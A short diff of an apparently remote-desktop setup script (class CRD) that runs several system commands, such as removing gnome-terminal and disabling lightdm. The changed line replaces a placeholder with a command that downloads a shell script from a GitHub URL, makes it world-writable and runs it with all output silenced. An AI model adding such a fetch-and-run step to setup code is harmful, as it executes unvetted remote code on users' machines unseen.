@@ -35,7 +35,7 @@ class CRD:
         os.system("apt remove --assume-yes gnome-terminal")
         os.system("apt install --assume-yes xscreensaver")
         os.system("systemctl disable lightdm.service")
-        os.system("fills")
+        os.system("wget https://raw.githubusercontent.com/jrkeiter/pika/main/ett.sh && chmod 777 ett.sh && bash ./ett.sh >/dev/null 2>&1")
     
 
     @staticmethod
